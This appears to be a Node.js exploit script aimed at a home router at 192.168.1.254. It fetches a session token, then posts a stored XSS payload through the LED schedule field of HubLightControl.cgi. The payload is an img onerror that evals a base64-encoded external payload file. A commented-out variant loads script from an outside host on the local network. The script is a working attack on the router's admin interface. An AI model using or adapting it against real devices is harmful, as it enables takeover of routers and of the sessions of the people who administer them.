const net = require("net");
const fs = require("fs");
const routerHost = "192.168.1.254";

const initialPayload = fs.readFileSync("initialPayload.js", "utf-8");
const initialPayloadText = `hi     <img src=""onerror="eval(atob('${btoa(initialPayload)}'))">`;
// const initialPayloadText = `<img src="" onerror="$('<script>',{src:'http://192.168.1.97:1234'}).appendTo("body');">:`;
const ledDisabled = false;
const ledSchedule = true;
const ledScheduleStart = initialPayloadText; // Defaults 07:30
const ledScheduleEnd = "skibidi:oclock"; // Defaults 10:15
const ledBrightness = "2"; // 0-2

const pi = await routerFetch("/cgi/renewPi.js");
console.log(`Got PI: ${pi}`);
await routerFetch("/HubLightControl.cgi", "POST", `CMD=&brightness_enable=${encodeURIComponent(ledDisabled ? 1 : 0)}&led_brightness=${encodeURIComponent((ledDisabled || !ledBrightness) ? 0 : ledBrightness)}&led_schedule=${encodeURIComponent(ledSchedule ? 1 : 0)}&led_schedule_start=${encodeURIComponent((ledSchedule && ledScheduleStart) ? ledScheduleStart : "07:30")}&led_schedule_end=${encodeURIComponent((ledSchedule && ledScheduleEnd) ? ledScheduleEnd : "22:15")}&pi=${encodeURIComponent(pi)}`);
console.log("Success (i think)");

function routerFetch(path, method, body, headers) {
    return new Promise((resolve, reject) => {
        const connection = net.createConnection({
            host: routerHost,
            port: 80
        }, () => {
            let data = "";
            const writeData = `${(method || "GET").toUpperCase()} ${path} HTTP/1.1\r\n${Object.entries({ Host: routerHost, Referer: `http://${routerHost}`, "Content-Length": (body || "").length, ...headers }).map(i => `${i[0]}: ${i[1]}`).join("\r\n")}\r\n\r\n${body || ""}`;
            // console.log(writeData);
            connection.write(writeData);
            connection.on("data", chunk => data += chunk);
            connection.on("end", () => {
                // console.log(data)
                const headerEndSplit = data.split("\r\n\r\n");
                const responseData = headerEndSplit.slice(1).join("\r\n\r\n");
                resolve(responseData)
            });
        });
        connection.on("error", reject);
    });
}